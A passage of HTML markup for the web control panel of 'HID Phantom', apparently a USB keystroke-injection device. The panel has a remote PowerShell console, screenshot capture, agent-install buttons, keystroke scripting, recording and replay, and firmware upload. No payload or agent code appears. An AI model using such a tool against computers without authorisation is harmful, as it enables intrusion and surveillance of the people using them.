            padding: 10px 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .ps-prompt {
            color: #ffff00;
            font-weight: bold;
            font-size: 14px;
            white-space: nowrap;
            font-family: 'Consolas', 'Courier New', monospace;
        }

        #ps-command-input {
            flex: 1;
            background: transparent;
            border: none;
            color: #ffffff;
            font-family: 'Consolas', 'Courier New', monospace;
            font-size: 14px;
            outline: none;
            padding: 5px;
        }

        #ps-command-input::placeholder {
            color: #7a7a7a;
        }

        .ps-execute-btn {
            padding: 6px 15px;
            background: #0e639c;
            color: #ffffff;
            border: 1px solid #1177bb;
            cursor: pointer;
            font-family: inherit;
            font-size: 13px;
            text-align: center;
            transition: background 0.2s;
        }

        .ps-execute-btn:hover {
            background: #1177bb;
        }

        .ps-execute-btn:disabled {
            background: #3c3c3c;
            border-color: #555555;
            color: #7a7a7a;
            cursor: not-allowed;
        }

        @media (max-width: 768px) {
            #screenshot-modal-content {
                width: 98vw;
                height: 92vh;
                max-height: 92vh;
            }

            #serial-monitor-content {
                width: 95vw;
                height: 90vh;
                max-height: 90vh;
            }

            .ps-console-container {
                font-size: 12px;
            }

            #ps-command-input {
                font-size: 12px;
            }
        }
    </style>
</head>
<body>
    <!-- Toast Container -->
    <div id="toast-container"></div>

    <!-- Screenshot Viewer Modal -->
    <div id="screenshot-modal-overlay" class="modal-overlay">
        <div class="modal-content" id="screenshot-modal-content">
            <div class="ps-header">
                <div class="ps-header-title">
                    <b><span>S C R E E N S H O T _ V I E W</span></b>
                </div>
                <div class="ps-header-buttons">
                    <button id="install-agent-btn" onclick="installAgent()" class="ps-header-btn" disabled title="Install ScreenCapture agent">Install Agent</button>
                    <button onclick="downloadScreenshot()" class="ps-header-btn">💾 Download</button>
                    <button onclick="captureScreenshotAgain()" class="ps-header-btn">📸 Capture</button>
                    <button class="ps-header-btn exit" onclick="closeScreenshotModal()">Close</button>
                </div>
            </div>
            <div id="screenshot-status" style="padding: 15px; text-align: center; font-size: 14px; color: #90caf9; flex-shrink: 0;">
                Waiting for screenshot...
            </div>
            <div id="screenshot-container" style="flex: 1; display: flex; align-items: center; justify-content: center; padding: 8px; min-height: 0; max-height: calc(95vh - 150px); overflow: hidden;">
                <img id="screenshot-image" style="max-width: calc(95vw - 40px); max-height: calc(95vh - 170px); width: auto; height: auto; object-fit: contain; display: none; border: 2px solid #1e88e5; border-radius: 4px;">
            </div>
        </div>
    </div>

    <!-- Hidden file input for script upload -->
    <input type="file" id="script-upload-input" accept=".txt,.ps" />

    <!-- Device Info Modal -->
    <div id="device-modal-overlay" class="modal-overlay">
        <div class="modal-content">
            <div class="modal-header">📱 Device Information</div>
            <div id="modal-content">
                <div class="modal-row">
                    <span class="modal-label">Name:</span>
                    <span class="modal-value" id="modal-name">-</span>
                </div>
                <div class="modal-row">
                    <span class="modal-label">Type:</span>
                    <span class="modal-value" id="modal-type">-</span>
                </div>
                <div class="modal-row">
                    <span class="modal-label">Manufacturer:</span>
                    <span class="modal-value" id="modal-mfg">-</span>
                </div>
                <div class="modal-row">
                    <span class="modal-label">Vendor ID:</span>
                    <span class="modal-value" id="modal-vid">-</span>
                </div>
                <div class="modal-row">
                    <span class="modal-label">Product ID:</span>
                    <span class="modal-value" id="modal-pid">-</span>
                </div>
                <div class="modal-row">
                    <span class="modal-label">Serial:</span>
                    <span class="modal-value" id="modal-serial">-</span>
                </div>
            </div>
            <div style="margin-top: 16px; text-align: center;">
                <button onclick="closeDeviceModal()">Close</button>
            </div>
        </div>
    </div>

    <!-- Settings Modal -->
    <div id="settings-modal-overlay" class="modal-overlay">
        <div class="modal-content" id="settings-modal-content" style="max-width: 550px;">
            <div class="modal-header">⚙️ Settings</div>

            <!-- Firmware Update Section -->
            <div class="settings-section">
                <div class="settings-section-header">⚡ Firmware Update (OTA)</div>

                <div class="ota-warning">
                    ⚠️ Device will reboot during update. Connection will be temporarily lost (this is normal).
                </div>

                <div style="text-align: center; margin-bottom: 16px; font-size: 13px; color: #90caf9;">
                    <strong>Current Version:</strong> <span id="current-version">Loading...</span>
                </div>

                <div class="file-upload-area" id="upload-area">
                    <div style="font-size: 48px; margin-bottom: 12px;">📦</div>
                    <div style="font-size: 14px; color: #90caf9; margin-bottom: 8px;">
                        Click to select firmware file
                    </div>
                    <div style="font-size: 12px; color: #546e7a;">
                        or drag and drop .bin file here
                    </div>
                </div>

                <input type="file" id="file-input" accept=".bin">

                <div class="file-info" id="file-info" style="display: none;">
                    <strong>Selected:</strong> <span id="filename">-</span><br>
                    <strong>Size:</strong> <span id="filesize">-</span>
                </div>

                <div class="progress-container" id="progress-container" style="display: none;">
                    <div class="progress-bar" id="progress-bar"></div>
                    <div class="progress-text" id="progress-text">0%</div>
                </div>

                <div id="ota-status" style="text-align: center; margin: 16px 0; font-size: 14px; color: #90caf9;"></div>

                <button id="upload-btn" onclick="startOTAUpload()" disabled style="width: 100%;">Upload Firmware</button>
            </div>

            <!-- Factory Firmware Backup Section -->
            <div class="settings-section">
                <div class="settings-section-header">💾 Factory Firmware Backup</div>

                <div style="text-align: center; margin-bottom: 12px; font-size: 13px; color: #90caf9;">
                    <strong>Factory Backup:</strong> <span id="factory-backup-status">Checking...</span>
                </div>

                <div class="ota-warning" style="background: rgba(102, 187, 106, 0.1); border-left-color: #66bb6a; color: #81c784;">
                    💡 Save a known-good firmware as factory backup. Use GPIO12 (D6) factory reset (10s hold) to restore it.
                </div>

                <div class="file-upload-area" id="factory-upload-area" style="border-color: #66bb6a;">
                    <div style="font-size: 48px; margin-bottom: 12px;">💾</div>
                    <div style="font-size: 14px; color: #90caf9; margin-bottom: 8px;">
                        Click to select factory firmware
                    </div>
                    <div style="font-size: 12px; color: #546e7a;">
                        or drag and drop .bin file here
                    </div>
                </div>

                <input type="file" id="factory-file-input" accept=".bin">

                <div class="file-info" id="factory-file-info" style="display: none;">
                    <strong>Selected:</strong> <span id="factory-filename">-</span><br>
                    <strong>Size:</strong> <span id="factory-filesize">-</span>
                </div>

                <div class="progress-container" id="factory-progress-container" style="display: none;">
                    <div class="progress-bar" id="factory-progress-bar"></div>
                    <div class="progress-text" id="factory-progress-text">0%</div>
                </div>

                <div id="factory-status" style="text-align: center; margin: 12px 0; font-size: 13px; color: #90caf9;"></div>

                <div style="display: flex; gap: 8px;">
                    <button id="factory-upload-btn" onclick="startFactoryUpload()" disabled style="flex: 1;" class="btn-success">💾 Save as Factory</button>
                    <button id="factory-delete-btn" onclick="deleteFactoryFirmware()" disabled style="flex: 1;" class="btn-warning">🗑️ Delete Backup</button>
                </div>
            </div>

            <!-- AP Credentials Section -->
            <div class="settings-section">
                <div class="settings-section-header">📡 WiFi Credentials</div>

                <div class="ota-warning">
                    ⚠️ Device will reboot after saving. Reconnect to the new WiFi network.
                </div>

                <div style="margin-bottom: 12px;">
                    <label style="display: block; font-size: 12px; color: #78909c; margin-bottom: 4px; font-weight: 500;">SSID (1-32 characters)</label>
                    <input type="text" id="ap-ssid-input" maxlength="32" placeholder="Enter new SSID"
                           style="width: 100%; padding: 10px; background: #0a0e27; border: 2px solid #1e3a5f; border-radius: 4px; color: #e0e0e0; font-size: 14px;">
                </div>

                <div style="margin-bottom: 16px;">
                    <label style="display: block; font-size: 12px; color: #78909c; margin-bottom: 4px; font-weight: 500;">Password (8-63 characters)</label>
                    <input type="password" id="ap-password-input" maxlength="63" placeholder="Enter new password"
                           style="width: 100%; padding: 10px; background: #0a0e27; border: 2px solid #1e3a5f; border-radius: 4px; color: #e0e0e0; font-size: 14px;">
                </div>

                <div id="ap-status" style="text-align: center; margin: 12px 0; font-size: 13px; color: #90caf9; min-height: 20px;"></div>

                <button id="save-ap-btn" onclick="saveAPCredentials()" style="width: 100%;" class="btn-success">💾 Save & Reboot</button>
            </div>

            <!-- PhantomScript Safety Limits Section -->
            <div class="settings-section">
                <div class="settings-section-header">⚙️ PhantomScript Safety Limits</div>

                <div style="font-size: 13px; color: #90caf9; margin-bottom: 16px;">
                    Configure safety limits to prevent malicious or runaway scripts from consuming excessive resources.
                </div>

                <div style="margin-bottom: 12px;">
                    <label style="display: block; font-size: 12px; color: #78909c; margin-bottom: 4px; font-weight: 500;">Max Variables</label>
                    <input type="number" id="limit-max-variables" min="1" max="1000"
                           style="width: 100%; padding: 8px; background: #0a0e27; border: 2px solid #1e3a5f; border-radius: 4px; color: #e0e0e0; font-size: 14px;">
                </div>

                <div style="margin-bottom: 12px;">
                    <label style="display: block; font-size: 12px; color: #78909c; margin-bottom: 4px; font-weight: 500;">Max Constants</label>
                    <input type="number" id="limit-max-constants" min="1" max="1000"
                           style="width: 100%; padding: 8px; background: #0a0e27; border: 2px solid #1e3a5f; border-radius: 4px; color: #e0e0e0; font-size: 14px;">
                </div>

                <div style="margin-bottom: 12px;">
                    <label style="display: block; font-size: 12px; color: #78909c; margin-bottom: 4px; font-weight: 500;">Max Functions</label>
                    <input type="number" id="limit-max-functions" min="1" max="500"
                           style="width: 100%; padding: 8px; background: #0a0e27; border: 2px solid #1e3a5f; border-radius: 4px; color: #e0e0e0; font-size: 14px;">
                </div>

                <div style="margin-bottom: 12px;">
                    <label style="display: block; font-size: 12px; color: #78909c; margin-bottom: 4px; font-weight: 500;">Max Loop Iterations</label>
                    <input type="number" id="limit-max-loop-iterations" min="1" max="100000"
                           style="width: 100%; padding: 8px; background: #0a0e27; border: 2px solid #1e3a5f; border-radius: 4px; color: #e0e0e0; font-size: 14px;">
                </div>

                <div style="margin-bottom: 12px;">
                    <label style="display: block; font-size: 12px; color: #78909c; margin-bottom: 4px; font-weight: 500;">Max Call Depth</label>
                    <input type="number" id="limit-max-call-depth" min="1" max="100"
                           style="width: 100%; padding: 8px; background: #0a0e27; border: 2px solid #1e3a5f; border-radius: 4px; color: #e0e0e0; font-size: 14px;">
                </div>

                <div style="margin-bottom: 12px;">
                    <label style="display: block; font-size: 12px; color: #78909c; margin-bottom: 4px; font-weight: 500;">Max Line Length</label>
                    <input type="number" id="limit-max-line-length" min="1" max="1000"
                           style="width: 100%; padding: 8px; background: #0a0e27; border: 2px solid #1e3a5f; border-radius: 4px; color: #e0e0e0; font-size: 14px;">
                </div>

                <div style="margin-bottom: 12px;">
                    <label style="display: block; font-size: 12px; color: #78909c; margin-bottom: 4px; font-weight: 500;">Max String Length</label>
                    <input type="number" id="limit-max-string-length" min="1" max="10000"
                           style="width: 100%; padding: 8px; background: #0a0e27; border: 2px solid #1e3a5f; border-radius: 4px; color: #e0e0e0; font-size: 14px;">
                </div>

                <div style="margin-bottom: 12px;">
                    <label style="display: block; font-size: 12px; color: #78909c; margin-bottom: 4px; font-weight: 500;">Max Script Lines</label>
                    <input type="number" id="limit-max-script-lines" min="1" max="10000"
                           style="width: 100%; padding: 8px; background: #0a0e27; border: 2px solid #1e3a5f; border-radius: 4px; color: #e0e0e0; font-size: 14px;">
                </div>

                <div style="margin-bottom: 16px;">
                    <label style="display: block; font-size: 12px; color: #78909c; margin-bottom: 4px; font-weight: 500;">Max Execution Time (seconds)</label>
                    <input type="number" id="limit-max-execution-time" min="1" max="3600"
                           style="width: 100%; padding: 8px; background: #0a0e27; border: 2px solid #1e3a5f; border-radius: 4px; color: #e0e0e0; font-size: 14px;">
                </div>

                <div style="margin-bottom: 16px;">
                    <label style="display: block; font-size: 12px; color: #78909c; margin-bottom: 4px; font-weight: 500;">Default Inter-Keystroke Delay (ms)</label>
                    <input type="number" id="limit-default-inter-keystroke-delay" min="0" max="1000"
                           style="width: 100%; padding: 8px; background: #0a0e27; border: 2px solid #1e3a5f; border-radius: 4px; color: #e0e0e0; font-size: 14px;">
                    <div style="font-size: 11px; color: #546e7a; margin-top: 4px;">Delay between keystrokes when typing strings (0-1000ms)</div>
                </div>

                <div id="script-settings-status" style="text-align: center; margin: 12px 0; font-size: 13px; color: #90caf9; min-height: 20px;"></div>

                <div style="display: flex; gap: 8px; margin-bottom: 12px;">
                    <button onclick="saveScriptSettings()" class="btn-success" style="flex: 1;">💾 Save</button>
                    <button onclick="resetScriptSettings()" class="btn-warning" style="flex: 1;">🔔 Reset</button>
                </div>
            </div>

            <!-- Factory Reset Section -->
            <div class="settings-section">
                <div class="settings-section-header">🔔 Factory Reset</div>

                <div class="ota-warning">
                    ⚠️ <strong>Settings Reset:</strong> Deletes WiFi credentials, recordings, and OTA files. Keeps current firmware.<br>
                    ⚠️ <strong>Full Factory Reset:</strong> Restores factory firmware backup (if saved). Cannot be undone!
                </div>

                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
                    <button onclick="confirmSettingsReset()" class="btn-warning" style="width: 100%;">
                        <span style="font-size: 16px;">⚙️</span><br>
                        <span style="font-size: 11px;">Settings Reset</span>
                    </button>
                    <button onclick="confirmFullFactoryReset()" class="btn-record" style="width: 100%;">
                        <span style="font-size: 16px;">🏭</span><br>
                        <span style="font-size: 11px;">Full Reset</span>
                    </button>
                </div>

                <div id="reset-status" style="text-align: center; margin-top: 12px; font-size: 13px; color: #90caf9; min-height: 20px;"></div>
            </div>

            <div style="margin-top: 20px; text-align: center;">
                <button onclick="closeSettingsModal()" class="btn-secondary" style="width: 100%;">Close</button>
            </div>
        </div>
    </div>

    <!-- Script Settings Modal -->
    <div id="script-settings-modal-overlay" class="modal-overlay">
        <div class="modal-content" id="script-settings-modal-content" style="max-width: 500px;">
            <div class="modal-header">⚙️ PhantomScript Safety Limits</div>

            <div class="settings-section">
                <div style="font-size: 13px; color: #90caf9; margin-bottom: 16px;">
                    Configure safety limits to prevent malicious or runaway scripts from consuming excessive resources.
                </div>

                <div style="margin-bottom: 12px;">
                    <label style="display: block; font-size: 12px; color: #78909c; margin-bottom: 4px; font-weight: 500;">Max Variables</label>
                    <input type="number" id="limit-max-variables" min="1" max="1000"
                           style="width: 100%; padding: 8px; background: #0a0e27; border: 2px solid #1e3a5f; border-radius: 4px; color: #e0e0e0; font-size: 14px;">
                </div>

                <div style="margin-bottom: 12px;">
                    <label style="display: block; font-size: 12px; color: #78909c; margin-bottom: 4px; font-weight: 500;">Max Constants</label>
                    <input type="number" id="limit-max-constants" min="1" max="1000"
                           style="width: 100%; padding: 8px; background: #0a0e27; border: 2px solid #1e3a5f; border-radius: 4px; color: #e0e0e0; font-size: 14px;">
                </div>

                <div style="margin-bottom: 12px;">
                    <label style="display: block; font-size: 12px; color: #78909c; margin-bottom: 4px; font-weight: 500;">Max Functions</label>
                    <input type="number" id="limit-max-functions" min="1" max="500"
                           style="width: 100%; padding: 8px; background: #0a0e27; border: 2px solid #1e3a5f; border-radius: 4px; color: #e0e0e0; font-size: 14px;">
                </div>

                <div style="margin-bottom: 12px;">
                    <label style="display: block; font-size: 12px; color: #78909c; margin-bottom: 4px; font-weight: 500;">Max Loop Iterations</label>
                    <input type="number" id="limit-max-loop-iterations" min="1" max="100000"
                           style="width: 100%; padding: 8px; background: #0a0e27; border: 2px solid #1e3a5f; border-radius: 4px; color: #e0e0e0; font-size: 14px;">
                </div>

                <div style="margin-bottom: 12px;">
                    <label style="display: block; font-size: 12px; color: #78909c; margin-bottom: 4px; font-weight: 500;">Max Call Depth</label>
                    <input type="number" id="limit-max-call-depth" min="1" max="100"
                           style="width: 100%; padding: 8px; background: #0a0e27; border: 2px solid #1e3a5f; border-radius: 4px; color: #e0e0e0; font-size: 14px;">
                </div>

                <div style="margin-bottom: 12px;">
                    <label style="display: block; font-size: 12px; color: #78909c; margin-bottom: 4px; font-weight: 500;">Max Line Length</label>
                    <input type="number" id="limit-max-line-length" min="1" max="1000"
                           style="width: 100%; padding: 8px; background: #0a0e27; border: 2px solid #1e3a5f; border-radius: 4px; color: #e0e0e0; font-size: 14px;">
                </div>

                <div style="margin-bottom: 12px;">
                    <label style="display: block; font-size: 12px; color: #78909c; margin-bottom: 4px; font-weight: 500;">Max String Length</label>
                    <input type="number" id="limit-max-string-length" min="1" max="10000"
                           style="width: 100%; padding: 8px; background: #0a0e27; border: 2px solid #1e3a5f; border-radius: 4px; color: #e0e0e0; font-size: 14px;">
                </div>

                <div style="margin-bottom: 12px;">
                    <label style="display: block; font-size: 12px; color: #78909c; margin-bottom: 4px; font-weight: 500;">Max Script Lines</label>
                    <input type="number" id="limit-max-script-lines" min="1" max="10000"
                           style="width: 100%; padding: 8px; background: #0a0e27; border: 2px solid #1e3a5f; border-radius: 4px; color: #e0e0e0; font-size: 14px;">
                </div>

                <div style="margin-bottom: 16px;">
                    <label style="display: block; font-size: 12px; color: #78909c; margin-bottom: 4px; font-weight: 500;">Max Execution Time (seconds)</label>
                    <input type="number" id="limit-max-execution-time" min="1" max="3600"
                           style="width: 100%; padding: 8px; background: #0a0e27; border: 2px solid #1e3a5f; border-radius: 4px; color: #e0e0e0; font-size: 14px;">
                </div>

                <div style="margin-bottom: 16px;">
                    <label style="display: block; font-size: 12px; color: #78909c; margin-bottom: 4px; font-weight: 500;">Default Inter-Keystroke Delay (ms)</label>
                    <input type="number" id="limit-default-inter-keystroke-delay" min="0" max="1000"
                           style="width: 100%; padding: 8px; background: #0a0e27; border: 2px solid #1e3a5f; border-radius: 4px; color: #e0e0e0; font-size: 14px;">
                    <div style="font-size: 11px; color: #546e7a; margin-top: 4px;">Delay between keystrokes when typing strings (0-1000ms)</div>
                </div>

                <div id="script-settings-status" style="text-align: center; margin: 12px 0; font-size: 13px; color: #90caf9; min-height: 20px;"></div>

                <div style="display: flex; gap: 8px; margin-bottom: 12px;">
                    <button onclick="saveScriptSettings()" class="btn-success" style="flex: 1;">💾 Save</button>
                    <button onclick="resetScriptSettings()" class="btn-warning" style="flex: 1;">🔔 Reset</button>
                </div>

                <button onclick="closeScriptSettingsModal()" class="btn-secondary" style="width: 100%;">Close</button>
            </div>
        </div>
    </div>

    <!-- Input Control Modal -->
    <div id="input-modal-overlay" class="modal-overlay">
        <div class="modal-content" id="input-modal-content">
            <div class="modal-header">🎮 HID Input Control</div>

            <!-- Mode Selector (for hybrid/composite devices) -->
            <div id="input-mode-selector" style="display: none; margin-bottom: 16px;">
                <div class="button-group">
                    <button id="mode-mouse-btn" class="btn-secondary" onclick="switchInputMode('mouse')">🖱️ Mouse</button>
                    <button id="mode-keyboard-btn" class="btn-secondary" onclick="switchInputMode('keyboard')">⌨️ Keyboard</button>
                </div>
            </div>

            <!-- Mouse Input -->
            <div id="trackpad-container">
                <div id="trackpad-wrapper">
                    <canvas id="trackpad"></canvas>
                    <div id="scroll-area">
                        <div class="scroll-arrow-btn" id="scroll-up-arrow">⬆</div>
                        <div class="scroll-indicator" id="scroll-indicator"></div>
                        <div class="scroll-arrow-btn" id="scroll-down-arrow">⬇</div>
                    </div>
                </div>
                <div id="mouse-buttons">
                    <button class="mouse-btn btn-secondary" id="mouse-left-btn">LEFT</button>
                    <button class="mouse-btn btn-secondary" id="mouse-right-btn">RIGHT</button>
                </div>
            </div>

            <!-- Keyboard Input -->
            <div id="keyboard-container">
                <div class="keyboard-hint">Type below - keys will appear above</div>
                <div id="keyboard-display"></div>
                <input type="text" id="keyboard-input-field" placeholder="Click here and type...">
            </div>

            <div style="margin-top: 16px; text-align: center;">
                <button onclick="closeInputModal()">Close</button>
            </div>
        </div>
    </div>

    <!-- Virtual Keyboard Modal -->
    <div id="vkeyboard-modal-overlay" class="modal-overlay">
        <div class="modal-content">
            <div id="vkeyboard-header">
                <div id="vkeyboard-title">PHANTOM KEYBOARD</div>
                <button id="vkeyboard-close" onclick="closeVKeyboard()">✕</button>
            </div>
            <div id="vkeyboard-container">
    <!-- ROW 1: ESC + F-Keys + Navigation Cluster -->
    <div class="vkey-row">
        <div class="vkey" data-key="0x29">Esc</div>
        <div class="vkey" data-key="0x3A">F1</div>
        <div class="vkey" data-key="0x3B">F2</div>
        <div class="vkey" data-key="0x3C">F3</div>
        <div class="vkey" data-key="0x3D">F4</div>
        <div class="vkey" data-key="0x3E">F5</div>
        <div class="vkey" data-key="0x3F">F6</div>
        <div class="vkey" data-key="0x40">F7</div>
        <div class="vkey" data-key="0x41">F8</div>
        <div class="vkey" data-key="0x42">F9</div>
        <div class="vkey" data-key="0x43">F10</div>
        <div class="vkey" data-key="0x44">F11</div>
        <div class="vkey" data-key="0x45">F12</div>
        <div class="vkey" data-key="0x4C">Del</div>
        <div class="vkey" data-key="0x4A">Home</div>
        <div class="vkey" data-key="0x4D">End</div>
        <div class="vkey" data-key="0x4B">PgUp</div>
        <div class="vkey" data-key="0x4E">PgDn</div>
        <div class="vkey" data-key="0x49">Ins</div>
    </div>

    <!-- ROW 2: Number Row + Numpad Top -->
    <div class="vkey-row">
        <div class="vkey" data-key="0x35">`</div>
        <div class="vkey" data-key="0x1E">1</div>
        <div class="vkey" data-key="0x1F">2</div>
        <div class="vkey" data-key="0x20">3</div>
        <div class="vkey" data-key="0x21">4</div>
        <div class="vkey" data-key="0x22">5</div>
        <div class="vkey" data-key="0x23">6</div>
        <div class="vkey" data-key="0x24">7</div>
        <div class="vkey" data-key="0x25">8</div>
        <div class="vkey" data-key="0x26">9</div>
        <div class="vkey" data-key="0x27">0</div>
        <div class="vkey" data-key="0x2D">-</div>
        <div class="vkey" data-key="0x2E">=</div>
        <div class="vkey w-2" data-key="0x2A">Backspace</div>
        <div class="vkey toggle" data-key="0x53">Num</div>
        <div class="vkey" data-key="0x54">/</div>
        <div class="vkey" data-key="0x55">*</div>
        <div class="vkey" data-key="0x56">-</div>
    </div>

    <!-- ROW 3: QWERTY Row + Numpad -->
    <div class="vkey-row">
        <div class="vkey w-1_5" data-key="0x2B">Tab</div>
        <div class="vkey" data-key="0x14">Q</div>
        <div class="vkey" data-key="0x1A">W</div>
        <div class="vkey" data-key="0x08">E</div>
        <div class="vkey" data-key="0x15">R</div>
        <div class="vkey" data-key="0x17">T</div>
        <div class="vkey" data-key="0x1C">Y</div>
        <div class="vkey" data-key="0x18">U</div>
        <div class="vkey" data-key="0x0C">I</div>
        <div class="vkey" data-key="0x12">O</div>
        <div class="vkey" data-key="0x13">P</div>
        <div class="vkey" data-key="0x2F">[</div>
        <div class="vkey" data-key="0x30">]</div>
        <div class="vkey w-1_5" data-key="0x31">\</div>
        <div class="vkey" data-key="0x57">+</div>
        <div class="vkey" data-key="0x5F">7</div>
        <div class="vkey" data-key="0x60">8</div>
        <div class="vkey" data-key="0x61">9</div>
    </div>

    <!-- ROW 4: Home Row + Numpad -->
    <div class="vkey-row">
        <div class="vkey toggle w-1_75" data-key="0x39">Caps</div>
        <div class="vkey" data-key="0x04">A</div>
        <div class="vkey" data-key="0x16">S</div>
        <div class="vkey" data-key="0x07">D</div>
        <div class="vkey" data-key="0x09">F</div>
        <div class="vkey" data-key="0x0A">G</div>
        <div class="vkey" data-key="0x0B">H</div>
        <div class="vkey" data-key="0x0D">J</div>
        <div class="vkey" data-key="0x0E">K</div>
        <div class="vkey" data-key="0x0F">L</div>
        <div class="vkey" data-key="0x33">;</div>
        <div class="vkey" data-key="0x34">'</div>
        <div class="vkey w-2_15" data-key="0x28">Enter</div>
        <div class="vkey" data-key="0x63">.</div>
        <div class="vkey" data-key="0x5C">4</div>
        <div class="vkey" data-key="0x5D">5</div>
        <div class="vkey" data-key="0x5E">6</div>
    </div>

    <!-- ROW 5: Bottom Row + Up Arrow + Numpad -->
    <div class="vkey-row">
        <div class="vkey modifier w-2_25" data-key="0xE1">Shift</div>
        <div class="vkey" data-key="0x1D">Z</div>
        <div class="vkey" data-key="0x1B">X</div>
        <div class="vkey" data-key="0x06">C</div>
        <div class="vkey" data-key="0x19">V</div>
        <div class="vkey" data-key="0x05">B</div>
        <div class="vkey" data-key="0x11">N</div>
        <div class="vkey" data-key="0x10">M</div>
        <div class="vkey" data-key="0x36">,</div>
        <div class="vkey" data-key="0x37">.</div>
        <div class="vkey" data-key="0x38">/</div>
        <div class="vkey modifier w-2_5" data-key="0xE5">Shift</div>
        <div class="vkey" data-key="0x52">↑</div>
        <div class="vkey" data-key="0x59">1</div>
        <div class="vkey" data-key="0x5A">2</div>
        <div class="vkey" data-key="0x5B">3</div>
    </div>

    <!-- ROW 6: Modifiers + Spacebar + Arrow Keys + Numpad -->
    <div class="vkey-row">
        <div class="vkey modifier w-1_25" data-key="0xE0">Ctrl</div>
        <div class="vkey modifier w-1_25" data-key="0xE3">⊞</div>
        <div class="vkey modifier w-1_25" data-key="0xE2">Alt</div>
        <div class="vkey spacebar" data-key="0x2C">Space</div>
        <div class="vkey modifier w-1_25" data-key="0xE6">Alt</div>
        <div class="vkey modifier w-1_25" data-key="0xFF" title="Fn (media layer)">Fn</div>
        <div class="vkey modifier w-1_25" data-key="0xE4">Ctrl</div>
        <div class="vkey" data-key="0x50">←</div>
        <div class="vkey" data-key="0x51">←</div>
        <div class="vkey" data-key="0x4F">←</div>
        <div class="vkey" data-key="0x62">0</div>
    </div>
</div>
            <div id="vkeyboard-status">Touch and hold keys for combinations. Tap modifiers to toggle.</div>
        </div>
    </div>

    <!-- PowerShell Console Modal -->
    <div id="serial-monitor-modal-overlay" class="modal-overlay">
        <div class="modal-content" id="serial-monitor-content">
            <div class="ps-header">
                <div class="ps-header-title">
                    <div class="ps-status-indicator" id="ps-status-indicator"></div>
                    <b>
                        <span>P H A N T O M _ S H E L L ></span>
                    </b>
                </div>
                <div class="ps-header-buttons">
                    <button class="ps-header-btn start" onclick="startShell()">Start</button>
                    <button id="install-ps-agent-btn" onclick="installPSAgent()" class="ps-header-btn" disabled title="Install PowerShell agent (requires storage mode)">Install Agent</button>
                    <button class="ps-header-btn" onclick="restartSerialMonitor()">Restart</button>
                    <button class="ps-header-btn" onclick="clearSerialMonitor()">Clear</button>
                    <button class="ps-header-btn" onclick="closeSerialMonitor()">Minimize</button>
                    <button class="ps-header-btn exit" onclick="exitSerialMonitor()">Exit</button>
                </div>
            </div>
            <div class="ps-console-container" id="ps-console-container">
                <div class="ps-console-output" id="ps-console-output">Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

</div>
            </div>
            <div class="ps-input-container">
                <span class="ps-prompt">PS></span>
                <input type="text" id="ps-command-input" placeholder="Enter command..." autocomplete="off" spellcheck="false">
                <button class="ps-execute-btn" id="ps-execute-btn" onclick="sendSerialCommand()">Execute</button>
            </div>
        </div>
    </div>

    <!-- Header -->
    <div id="header">
        <div style="display: flex; align-items: center; gap: 16px;">
            <h1>🖥️ HID Phantom <span id="version-badge" style="font-size: 10px; color: #546e7a; font-weight: 400;">v?.?.?</span></h1>
            <div id="status">
                <span class="status-indicator" id="status-led"></span>
                <span id="status-text">Disconnected</span>
            </div>
        </div>
        <div id="header-controls">
            <div class="toggle-container">
                <label class="toggle-label">Hybrid</label>
                <div class="toggle-switch" id="hybrid-toggle" data-toggle-type="hybrid" onclick="handleToggleSwitch('hybrid')" title="Toggle Hybrid Mode">
                    <div class="toggle-slider"></div>
                </div>
            </div>
            <div class="btn-separator"></div>
            <div class="toggle-container">
                <label class="toggle-label">Storage</label>
                <div class="toggle-switch" id="storage-toggle" data-toggle-type="storage" onclick="handleToggleSwitch('storage')" title="Toggle Storage Mode">
                    <div class="toggle-slider"></div>
                </div>
            </div>
            <div class="btn-separator"></div>
            <div class="toggle-container">
                <label class="toggle-label">Serial</label>
                <div class="toggle-switch" id="serial-toggle" data-toggle-type="serial" onclick="handleToggleSwitch('serial')" title="Toggle Serial CDC Mode">
                    <div class="toggle-slider"></div>
                </div>
            </div>
            <div class="btn-separator"></div>
            <div class="toggle-container">
                <label class="toggle-label">NetBridge</label>
                <div class="toggle-switch" id="netbridge-toggle" data-toggle-type="netbridge" onclick="handleToggleSwitch('netbridge')" title="Toggle Network Bridge Mode">
                    <div class="toggle-slider"></div>
                </div>
            </div>
            <div class="btn-separator" style="width: 12px;"></div>
            <button class="header-icon-btn" onclick="sendATCommand('AT+INFO')" title="Device Info">ℹ️</button>
            <button class="header-icon-btn" onclick="clearOutput()" title="Clear Output">🗑️</button>
            <button class="header-icon-btn" id="autoscroll-btn-icon" onclick="toggleAutoScroll()" title="Auto-scroll: ON">📜</button>
            <button class="header-icon-btn" onclick="openSettingsModal()" title="Settings">⚙️</button>
        </div>
    </div>

    <!-- Terminal -->
    <div id="terminal-container">
        <div class="scroll-btn" id="scroll-up-btn" onclick="scrollOutput('up')">▲</div>
        <div id="output"></div>
        <div class="scroll-btn" id="scroll-down-btn" onclick="scrollOutput('down')">▼</div>
    </div>

    <!-- Control Panel -->
    <div id="control-panel">
        <!-- Device Commands Row -->
        <div class="section-label">Device</div>
        <div class="button-group">
            <button id="shell-btn" onclick="openSerialMonitor()" disabled title="PowerShell Console">📟 Shell</button>
            <button id="screen-btn" class="btn-primary" onclick="openScreenshotModal()" disabled title="Open Screenshot Viewer">📷 Screen</button>
            <button id="mouse-device-btn" class="btn-success" onclick="openMouseInput()" disabled title="Mouse Input">🖱️ Mouse</button>
            <button id="keyboard-device-btn" class="btn-success" onclick="openKeyboardInput()" disabled title="Keyboard Input">⌨️ Keyboard</button>
        </div>

        <!-- Recording Controls Row -->
        <div class="section-label">Recording</div>
        <div class="button-group">
            <button id="rec-toggle" class="btn-record" onclick="toggleRecording()" title="Record/Stop">
                <span id="rec-icon">⬤</span> <span id="rec-label">Record</span>
            </button>
            <button id="rec-replay" class="btn-warning" onclick="replayRecording()" disabled title="Replay">▶ Replay</button>
            <button id="rec-export" class="btn-primary" onclick="exportRecording()" disabled title="Export">💾 Export</button>
            <button id="rec-clear" class="btn-secondary" onclick="clearRecording()" disabled title="Clear">🗑️ Clear</button>
        </div>

        <!-- PhantomScript Controls Row -->
        <div class="section-label">PhantomScript</div>
        <div class="button-group">
            <button id="script-upload" class="btn-primary" onclick="uploadScript()" title="Upload script">📦Upload</button>
            <button id="script-run" class="btn-success" onclick="runScript()" disabled title="Execute script">▶ Run</button>
